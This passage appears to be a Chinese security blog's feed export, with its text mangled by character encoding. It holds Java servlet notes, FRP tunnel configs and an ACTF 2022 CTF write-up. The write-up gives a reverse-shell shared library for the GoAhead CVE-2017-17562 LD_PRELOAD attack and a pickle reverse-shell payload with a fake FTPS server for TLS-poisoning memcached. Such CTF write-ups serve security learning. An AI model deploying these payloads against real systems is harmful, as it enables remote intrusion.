punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·å–POSTå‚æ•°</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> login <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> a<span class="token operator">=</span>req<span class="token punctuation">.</span><span class="token function">getParameterNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> paraName<span class="token operator">=</span>a<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>paraName<span class="token operator">+</span><span class="token string">"="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>paraName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><p>JSPåœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šè¢«è½¬æ¢æˆä¸€ä¸ªJavaç±»</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;åˆå§‹åŒ–pubilc void _jspInit()&#123;&#125;&#x2F;&#x2F;é”€æ¯public void _jspDestory()&#123;&#125;&#x2F;&#x2F;JSPServicepublic void _jspService()(HttpServletRequest request,HttpServletResponse response)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JSPä½œç”¨</p><p>åˆ¤æ–­è¯·æ±‚</p><p>å†…ç½®çš„ä¸€äº›å¯¹è±¡</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>jsp<span class="token punctuation">.</span></span>PageContext</span> pageContext<span class="token comment">//é¡µé¢ä¸Šä¸‹æ–‡</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›å°å°å·¥å…·çš„ä½¿ç”¨</title>
      <link href="/posts/78e6073f.html"/>
      <url>/posts/78e6073f.html</url>
      
        <content type="html"><![CDATA[<h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><span id="more"></span><h3 id="FRPSï¼ˆæœåŠ¡ç«¯é…ç½®ï¼‰"><a href="#FRPSï¼ˆæœåŠ¡ç«¯é…ç½®ï¼‰" class="headerlink" title="FRPSï¼ˆæœåŠ¡ç«¯é…ç½®ï¼‰"></a>FRPSï¼ˆæœåŠ¡ç«¯é…ç½®ï¼‰</h3><pre class="line-numbers language-none"><code class="language-none">#frps.ini[common]bind_port        &#x3D; 7000                # æœåŠ¡ç›‘å¬ç«¯å£bind_addr        &#x3D; 0.0.0.0             # ç›‘å¬IPtoken            &#x3D; 123456              # å¯†é’¥#ä»¥ä¸‹ä¸ºå¯é€‰å†…å®¹dashboard_port   &#x3D; 7500                # webé¢æ¿dashboard_user   &#x3D; admin               # é¢æ¿ç”¨æˆ·ådashboard_pwd    &#x3D; admin               # é¢æ¿å¯†ç subdomain_host   &#x3D; *.darkflow.top      # WEBè®¿é—®åŸŸåç»‘å®šï¼ˆç»‘å®šååªèƒ½ç»‘å®šå­åŸŸåè®¿é—®ï¼‰vhost_http_port  &#x3D; 10000               # webæœåŠ¡httpç«¯å£vhost_https_port &#x3D; 10001               # webæœåŠ¡httpsç«¯å£<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="FRPCï¼ˆå®¢æˆ·ç«¯é…ç½®ï¼‰"><a href="#FRPCï¼ˆå®¢æˆ·ç«¯é…ç½®ï¼‰" class="headerlink" title="FRPCï¼ˆå®¢æˆ·ç«¯é…ç½®ï¼‰"></a>FRPCï¼ˆå®¢æˆ·ç«¯é…ç½®ï¼‰</h3><pre class="line-numbers language-none"><code class="language-none">#frpc[common]server_addr &#x3D; 1.1.1.1             # æœåŠ¡å™¨IPæˆ–è€…åœ°å€server_port &#x3D; 7000                # æœåŠ¡å™¨æä¾›çš„ç«¯å£å·token &#x3D; 123456                    # æœåŠ¡å™¨æä¾›çš„token#ä»¥ä¸‹ä¸ºä¸åŒæœåŠ¡é€šç”¨é…ç½®æ¨¡ç‰ˆ[æœåŠ¡å]type &#x3D; tcp                        # åè®®ç±»å‹local_ip &#x3D; 127.0.0.1              # ç©¿é€çš„æœ¬åœ°åœ°å€local_port &#x3D; 5001                 # ç©¿é€çš„æœ¬åœ°ç«¯å£[æœåŠ¡å]type &#x3D; http                       # åè®®ç±»å‹local_ip &#x3D; 127.0.0.1              # ç©¿é€çš„æœ¬åœ°åœ°å€local_port &#x3D; 80                   # ç©¿é€çš„æœ¬åœ°ç«¯å£custom_domains &#x3D; frp.darkflow.top # å¡«å†™ä½ çš„åŸŸå<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF 2022</title>
      <link href="/posts/1c461d7e.html"/>
      <url>/posts/1c461d7e.html</url>
      
        <content type="html"><![CDATA[<h1 id="ACTF-2022"><a href="#ACTF-2022" class="headerlink" title="ACTF 2022"></a>ACTF 2022</h1><p><del>å’Œå­¦é•¿ä¸€èµ·ç†¬å¤§å¤œåšä¸å‡ºæ¥é¢˜çœŸæ˜¯å¤ªçˆ½ğŸŒ¶ï¸ï¼Œä¸‹æ¬¡ç»§ç»­</del></p><span id="more"></span><h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><p>æ˜¯CVEï¼Œå¥½è€¶</p><p><a href="https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2017-17562/README.zh-cn.md">CVE-2017-17562</a></p><p>å…ˆå†™å¼¹shellçš„soæ–‡ä»¶</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">aaanb</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -c 'bash -i >&amp; /dev/tcp/IP/ç«¯å£ 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//gcc -shared -fPIC ./payload.c -o payload.so</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†ç”Ÿæˆçš„soæ–‡ä»¶ä½œä¸ºæ–‡ä»¶å‘é€ï¼Œå¹¶ä¸”åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ <code>LD_PRELOAD=/proc/self/fd/0</code>ï¼Œç”±äºé¢˜ç›®æ˜¯å…¬å…±ç¯å¢ƒã€‚éœ€è¦å¯¹æœ€åæ•°å­—è¿›è¡Œçˆ†ç ´</p><h2 id="ToLeSion"><a href="#ToLeSion" class="headerlink" title="ToLeSion"></a>ToLeSion</h2><p><del>ç†¬ä¸€æ™šä¸Šæ²¡åšå‡ºæ¥çš„é¢˜</del></p><p>è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿çš„ï¼Œå…ˆçœ‹é¢˜ï¼Œcurlè®¿é—®é“¾æ¥ï¼Œçœ‹äº†ä¸€ä¸‹å‰©ä¸‹çš„<del>æˆ‘è®¤è¯†çš„</del>åè®®åªæœ‰FTPSäº†ï¼Œåˆé¢˜ç›®ä¸­å†™äº†ä½¿ç”¨äº†memcachedï¼Œå¤–åŠ é¢˜ç›®ç¯å¢ƒæ˜¯pythonï¼Œæœ€ç»ˆæ‰¾åˆ°äº†<a href="https://blog.zeddyu.info/2021/05/19/tls-ctf/">è¿™ä¸ª</a>ï¼Œå¤§æ¦‚æµç¨‹å°±æ˜¯é€šè¿‡TLSå¤ç”¨ï¼Œå°†payloadæ”¾åˆ°TLSè¿›è¡Œèº«ä»½è¯†åˆ«çš„SessionIDçš„ä½ç½®ï¼Œå¯¼è‡´éæ³•çš„å†…å®¹è¢«æ³¨å…¥åˆ°memcachedä¸­ï¼Œç„¶åæ›´æ”¹sessionIDå°†å®ç°pickleååºåˆ—åŒ–æ¥åå¼¹shell</p><p>æœ¬é¢˜å…·ä½“æµç¨‹å¦‚ä¸‹</p><ul><li>é¦–å…ˆä¼ªé€ ä¸€ä¸ªFTPSæœåŠ¡å™¨ï¼Œå¹¶ä¸”åˆ©ç”¨ä»£ç†æ›´æ”¹TLSä¸­SessionIDä¸ºæˆ‘ä»¬çš„payload</li><li>åœ¨å—å®³è€…è®¿é—®æˆ‘ä»¬çš„FTPSæœåŠ¡å™¨ï¼Œé€šè¿‡è¢«åŠ¨è¿æ¥çš„æ–¹å¼å°†æ•°æ®é“¾è·¯çš„åœ°å€ç«¯å£æŒ‡å‘å—å®³è€…æœ¬åœ°çš„memcachedæœåŠ¡</li><li>æ­¤æ—¶å—å®³è€…å¯¹æ•°æ®é“¾è·¯è¿›è¡ŒTLSä¼šè¯å¤ç”¨ï¼Œå°†å¸¦æœ‰payloadçš„TLSå®¢æˆ·ç«¯è¯·æ±‚å‘é€åˆ°memcachedæœåŠ¡ï¼Œå¯¼è‡´memcachedå‘½ä»¤æ‰§è¡Œï¼Œå°†æˆ‘ä»¬æ„é€ çš„åºåˆ—åŒ–å†…å®¹å†™å…¥åˆ°ç›®æ ‡çš„memcachedåº“ä¸­</li><li>æœ€åæ›´æ”¹sessionIDå¹¶é‡æ–°è®¿é—®ç½‘é¡µï¼ŒæœåŠ¡å™¨å–å‡ºåºåˆ—åŒ–åå†…å®¹ååºåˆ—åŒ–ï¼Œåå¼¹shell</li></ul><p>OKä¸Šé¢çš„æµç¨‹éƒ½å·²ç»æ‡‚äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆå®ç°å‘¢ï¼Œé¦–å…ˆæ˜¯ä¼ªé€ æœåŠ¡å™¨ï¼ˆæ¥è‡ªå­¦é•¿çš„å®Œæ•´è„šæœ¬ï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> socketserver<span class="token keyword">import</span> sys<span class="token keyword">import</span> redis<span class="token keyword">class</span> <span class="token class-name">Test2</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd <span class="token operator">=</span> <span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/IP/ç«¯å£ &lt;&amp;1'"</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pickle_code<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>Test2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle_code<span class="token punctuation">)</span>length<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>pickle_code<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b"\r\nset actfSession:J1an 0 0 "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pickle_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b"\r\n"</span><span class="token operator">+</span>pickle_code<span class="token operator">+</span><span class="token string">b"\r\n"</span><span class="token keyword">def</span> <span class="token function">set_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'payload len: '</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"è®¾ç½®çš„sessionidä¸º:"</span><span class="token punctuation">,</span>set_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payloadé•¿åº¦ä¸º:"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MyTCPHandler</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>StreamRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'[+] connected'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>request<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'220 (vsFTPd 3.0.3)\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span>flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 yolo\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 yolo\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'257 "/" is the current directory\r\n'</span><span class="token punctuation">)</span><span class="token comment"># vps:importlib/a/b</span><span class="token comment">#         self.data = self.rfile.readline().strip().decode()</span><span class="token comment">#         print(5,self.data, file=sys.stderr)</span><span class="token comment">#         self.request.sendall(b'250 Directory successfully changed.\r\n')</span><span class="token comment">#</span><span class="token comment">#         self.data = self.rfile.readline().strip().decode()</span><span class="token comment">#         print(6,self.data, file=sys.stderr)</span><span class="token comment">#         self.request.sendall(b'250 Directory successfully changed.\r\n')</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\r\n'</span><span class="token punctuation">)</span>        <span class="token comment"># self.data = self.rfile.readline().strip().decode()</span>        <span class="token comment"># # assert 'SIZE refs' == self.data, self.data</span>        <span class="token comment"># self.finish()</span>        <span class="token comment"># print(10,self.data, file=sys.stderr)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'213 7\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'125 Data connection already open. Transfer starting.\r\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'250 Requested file action okay, completed.'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"DIE....."</span><span class="token punctuation">)</span>        <span class="token comment"># exit()</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä½¿ç”¨ç«¯å£:"</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">with</span> socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyTCPHandler<span class="token punctuation">)</span> <span class="token keyword">as</span> server<span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start..."</span><span class="token punctuation">)</span>        server<span class="token punctuation">.</span>handle_request<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"stop"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"END...."</span><span class="token punctuation">)</span>        <span class="token comment"># exit()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆå¯åŠ¨TLSçš„ä»£ç†æœåŠ¡å™¨ï¼Œä½¿ç”¨<a href="https://github.com/ZeddYu/TLS-poison/">å·¥å…·</a>è®¾ç½®å¥½äº†ä¹‹åï¼Œå¯¼å…¥è¯ä¹¦ç§é’¥é€šè¿‡ä¸€ä¸‹å‘½ä»¤æ‰“å¼€ä»£ç†</p><pre class="line-numbers language-none"><code class="language-none">TLS-poison&#x2F;client-hello-poisoning&#x2F;custom-tls&#x2F;target&#x2F;debug&#x2F;custom-tls -p 11211 --certs &#x2F;home&#x2F;ubuntu&#x2F;tls&#x2F;fullchain.pem --key &#x2F;home&#x2F;ubuntu&#x2F;tls&#x2F;privkey.pem forward 2048<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶æˆ‘ä»¬å‘å¾€11211ç«¯å£çš„å¸¦TLSçš„è¯·æ±‚å°±ä¼šè¢«è§£å¯†å¹¶è½¬å‘åˆ°2048ç«¯å£ï¼Œç”±äºè¿™ä¸ªå·¥å…·é€šè¿‡è¯»å–redisä¸­çš„payloadæ¥ä¼ è¾“æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆå°†payloadå­˜å…¥redisï¼Œç„¶åè®©å—å®³è€…å¯¹æˆ‘ä»¬æœåŠ¡å™¨çš„11211ç«¯å£å‘èµ·FTPSè¯·æ±‚ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¼ªé€ çš„æœåŠ¡å™¨ä¼šè®©å—å®³è€…çš„æœåŠ¡å™¨åˆ°127.0.0.1:11200å»è·å–ftpä¼ 